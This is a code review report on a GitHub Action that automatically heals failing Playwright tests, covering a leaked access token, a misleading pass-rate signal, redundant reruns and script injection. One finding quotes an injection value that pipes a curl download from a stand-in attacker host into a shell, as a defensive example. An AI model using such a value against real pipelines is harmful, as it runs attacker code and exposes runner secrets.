## Warnings

### WR-01: Global gitconfig PAT injection not cleaned up — leaks to subsequent jobs on self-hosted runners

**File:** `action.yml:215`

**Issue:** Step 5.1 writes the `healer-token` PAT into the global `~/.gitconfig` via `git config --global url."https://x-access-token:${HEALER_TOKEN}@github.com/".insteadOf`. Step 7 (cleanup) only kills processes — it does NOT unset this config entry. On self-hosted or persistent runners the PAT survives into subsequent unrelated jobs that share the same runner home directory. This defeats `persist-credentials: false` on checkout steps (SEC-01), which is a stated security non-negotiable in CLAUDE.md. GitHub-hosted runners are ephemeral and unaffected, but the action ships to consumers with arbitrary runner types.

**Fix:** Add a credential cleanup to Step 7 (which already runs under `if: always()` for heal mode):

```yaml
- name: Cleanup leaked processes (always, heal mode)
  if: always() && inputs.mode == 'heal'
  shell: bash
  run: |
    pkill -f "playwright-mcp" || true
    if [[ -f /tmp/playwright-healer-app-pid ]]; then
      kill "$(cat /tmp/playwright-healer-app-pid)" 2>/dev/null || true
    fi
    # CRACK-2 cleanup: remove PAT-bearing gitconfig entry (self-hosted runner safety)
    git config --global --unset \
      'url.https://x-access-token:'"${HEALER_TOKEN}"'@github.com/.insteadOf' \
      2>/dev/null || true
```

Alternatively, scope the credential to the workspace with `--local` instead of `--global` (requires Step 5.1 to run after the checkout step, which it already does). A `--local` config is automatically discarded when the workspace is cleaned.

```yaml
run: |
  git config --local url."https://x-access-token:${HEALER_TOKEN}@github.com/".insteadOf \
    "https://github.com/"
```

The `--local` approach is strictly safer because it is workspace-scoped and survives only as long as the `.git/config` file in the checked-out repo. This is the preferred fix; `--global` is unnecessary here.

### WR-02: `passRate: 1` in the skipPostFixValidation sentinel is a misleading truth signal

**File:** `src/healer/index.ts:227`

**Issue:** When `skipPostFixValidation` is true, the sentinel `ValidationResult` is `{ passed: 0, total: 0, passRate: 1, perRun: [] }`. `renderPrBody` in `pr-writer.ts` (line 31) renders this verbatim as "Pass rate: **100%** (0/0 reruns at `--retries=0`)". A maintainer reviewing the PR sees a full pass signal when no validation ran at all. This can erode trust in the PR review process: if a reviewer automates on the pass rate, a `100%` from zero runs looks identical to a real hundred-percent result. The test suite (index.test.ts:378-399) verifies the structural shape of the sentinel but does not verify the rendered string.

**Fix:** Change `passRate` in the sentinel to `0` (no runs took place) and document the sentinel contract in `pr-writer.ts`. Then make `renderPrBody` special-case `total === 0`:

```typescript
// index.ts — sentinel
validation = { passed: 0, total: 0, passRate: 0, perRun: [] };
```

```typescript
// pr-writer.ts — renderPrBody, replace the Pass rate line:
const validationLine = args.validation.total === 0
  ? 'Pass rate: **skipped** (demo mode — fixture-ci.yml on this PR is the truth source)'
  : `Pass rate: **${passPct}%** (${args.validation.passed}/${args.validation.total} reruns at \`--retries=0\`)`;
```

This keeps `passRate: 0` accurate and surfaces the skip reason to the reviewer without requiring a separate field. The test at line 378 should additionally assert that `call.validation.passRate` is `0`, not `1`.

### WR-03: `validate()` is called unconditionally before `skipDeterministicCheck` is tested — wasted Playwright reruns on the hot path

**File:** `src/healer/index.ts:129-130`

**Issue:** The deterministic-check gate is:

```typescript
const sanity = await validate(payload.testFile, payload.testTitle, config.rerunCount, cwd);
if (!config.skipDeterministicCheck && sanity.passRate === 0) {
```

When `skipDeterministicCheck` is `true`, `validate()` runs `rerunCount` full Playwright executions (default: 10) before the result is discarded. In the demo workflow this means 10 redundant Playwright test invocations per heal dispatch. This is wasteful but also makes the skip flag inconsistent in its semantics: it suppresses the issue-filing branch but does not suppress the work that feeds it. The flag name implies "skip the check", not "run the check then ignore the result".

**Fix:** Guard the validate call with the flag:

```typescript
// Step 4: PRI-05 sanity rerun — skip entirely when the flag is set
if (!config.skipDeterministicCheck) {
  const sanity = await validate(payload.testFile, payload.testTitle, config.rerunCount, cwd);
  if (sanity.passRate === 0) {
    await fileIssue({ ..., failureMode: 'deterministic-failure', ... });
    return;
  }
}
```

The test `skipDeterministicCheck=true: gate bypassed when passRate=0, adapter called` (index.test.ts:328) verifies the issue is not filed but does NOT assert `mockValidate` call count. After this fix, `mockValidate` should be called 0 times (pre-fix) vs. ≥1 times currently when the flag is set — add a `expect(mockValidate).not.toHaveBeenCalled()` assertion to lock in the skip.

### IN-01: Script injection via `run: ${{ inputs.setup-command }}` and `run: bash -c "exec ${{ inputs.start-command }}" &`

**File:** `action.yml:184, 201`

**Issue:** Both `setup-command` and `start-command` are interpolated directly into `run:` shell script text via `${{ inputs.* }}`. A consumer passing `; curl attacker.example/exfil | sh` as `setup-command` would execute arbitrary code with the runner's permissions. This is a pre-existing pattern (present before Phase 03.1) and is a known trade-off for composite actions where the caller is expected to be a trusted maintainer — the action is designed for self-use or trusted-consumer use. However it should be documented in the README/SECURITY policy (Phase 6) as a requirement that these inputs must come from trusted sources (not from `${{ github.event.issue.body }}` or similar user-controlled values).

**Fix (documentation):** Phase 6 README should include a security note:

> `setup-command` and `start-command` are executed verbatim in a bash shell. Never populate them from untrusted sources such as issue bodies, PR titles, or user comments. These inputs are intended for static commands defined by the repository maintainer in the workflow YAML.

No code change required before Phase 6.

### IN-03: `clean: false` scope note — untracked files present during Playwright validation reruns

**File:** `action.yml:157`

**Issue:** `clean: false` prevents the checkout step from wiping untracked files in the workspace. The code comment explains this preserves consumer subpath-checkout directories (e.g., `.healer/`). This is correct. However the scope of the preservation extends into the `validate()` call (Step 10 / post-fix reruns): untracked files written by the consumer's `setup-command` (e.g., a local `.env` or config file written to the workspace) are present during post-fix Playwright reruns. The `--index` flag in `fix-applier.ts` correctly ensures those files are excluded from the git commit. The risk is limited to test-run environment state (e.g., a config file from setup-command could mask a broken environment reference in the test). Not a regression introduced in Phase 03.1, but worth noting as a documented limitation.

**Fix (documentation):** Add a comment to Step 1 in action.yml adjacent to the existing `clean: false` note:

```yaml
clean: false  # CONTEXT D-04: preserves consumer subpath dirs.
              # NOTE: untracked files from setup-command remain present
              # during post-fix validation reruns. This is intentional —
              # the app must be configured identically for reruns to be valid.
              # fix-applier uses --index to exclude these from the git commit.
```

No functional change required.
